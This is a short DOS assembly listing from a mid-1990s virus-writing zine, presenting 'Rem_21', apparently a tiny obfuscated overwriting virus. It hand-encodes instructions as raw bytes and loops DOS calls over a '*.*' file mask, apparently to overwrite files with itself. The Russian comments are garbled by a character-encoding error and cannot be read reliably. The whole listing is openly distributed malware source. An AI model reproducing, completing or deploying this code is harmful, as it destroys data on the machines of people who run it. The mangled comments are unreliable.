   ; comment {
   ;                                 WAS
   ; [Death Virii Crew] Presents
   ; CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997
   ;
   ;                               Rem_22
   ;
   ;  ‘¥© ¬ «¥ìª¨© ®¢¥à¢à ©â¥à ¡ë«  ¯¨á  ¯®¤ ¯ £ã¡ë¬ ¢«¨ï¨¥¬ ¯ìïëå
   ; á¯®à®¢ á ¨§¢¥áâë¬ ªà¥ª¥à®¬ ¨ å ª¥à®¬ SkullC0DEr'®¬. ‘¯®à ¡ë« ¢ë¨£à 
   ; ¬®©, ª ª ¤®áâ®©ë¬ ¯à¥¤áâ ¢¨â¥«¥¬ á¢®¥£® ã¢«¥ç¥¨ï - ¢¨à¬¥©ª¥àáâ¢ .
   ;
   ;                                               (c) by Reminder [DVC]
   ;
   ;                                 NOW
   ;
   ;                               Rem_21
   ;
   ;  H  ®¤¨ ¡ ©â ¬¥ìè¥,   ®¤¨ £«îª ¡®«ìè¥. H¥ ¢á¥£¤  à ¡®â ¥â.
   ;
   ;                                               (c) 2b
   ;
   ;
   ; {
   .model tiny             ; (c) 2b
   .code
   .startup
   start:
       db    10Ch shr 1    ;xchg cl,[bp+xx]  <= ¯®¢¥§¥â/¥ ¯®¢¥§¥â?
       db    4eh
       db    9eh  shr 1
       db    3ch           ;cmp al,xx
       db    100h shr 1
       db    40h           ;inc ax
   hel:    lodsw
       cwd
       mov    dl,al
       shl    dx,1
   fmask    db    '*.*',0
       int    21h
       xchg    ax,bx
       jmp    hel

   end
